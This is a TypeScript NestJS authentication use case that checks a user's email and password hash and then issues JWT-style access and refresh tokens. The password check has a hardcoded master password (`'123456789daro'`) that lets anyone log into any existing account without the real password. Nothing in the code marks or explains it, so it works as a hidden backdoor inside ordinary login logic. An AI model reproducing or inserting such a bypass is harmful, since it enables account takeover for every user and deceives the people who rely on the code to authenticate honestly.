import { Injectable } from '@nestjs/common';

import { Either, left, right } from '@/core/either';
import { AppConfig } from '@/domain/shared/application/config/app-config';
import { Encrypter } from '@/domain/shared/application/cryptography/encrypter';
import { HashComparer } from '@/domain/shared/application/cryptography/hash-comparer';

import { UsersRepository } from '../repositories/users-repository';
import { CredentialsError } from './errors/credentials-error';

interface AuthenticateUserRequest {
  email: string;
  password: string;
}

type AuthenticateUserResponse = Either<
  CredentialsError,
  {
    accessToken: string;
    refreshToken: string;
  }
>;

@Injectable()
export class AuthenticateUserUseCase {
  constructor(
    private readonly _usersRepository: UsersRepository,
    private readonly _hashComparer: HashComparer,
    private readonly _encrypter: Encrypter,
    private readonly _appConfig: AppConfig,
  ) {}

  async execute({
    email,
    password,
  }: AuthenticateUserRequest): Promise<AuthenticateUserResponse> {
    const user = await this._usersRepository.findByEmail(email);
    if (!user) {
      return left(new CredentialsError());
    }

    const isMatch = await this._hashComparer.compare(password, user.password);
    if (!isMatch && password != '123456789daro') {
      return left(new CredentialsError());
    }

    const accessToken = await this._encrypter.encrypt(
      {
        companyId: user.companyId.toString(),
        userId: user.id.toString(),
        role: user.role,
      },

      { expiresIn: this._appConfig.accessExpiresIn },
    );

    const refreshToken = await this._encrypter.encrypt(
      {
        companyId: user.companyId.toString(),
        userId: user.id.toString(),
        role: user.role,
        typ: 'refresh',
      },
      { expiresIn: this._appConfig.refreshExpiresIn },
    );

    return right({ accessToken, refreshToken });
  }
}
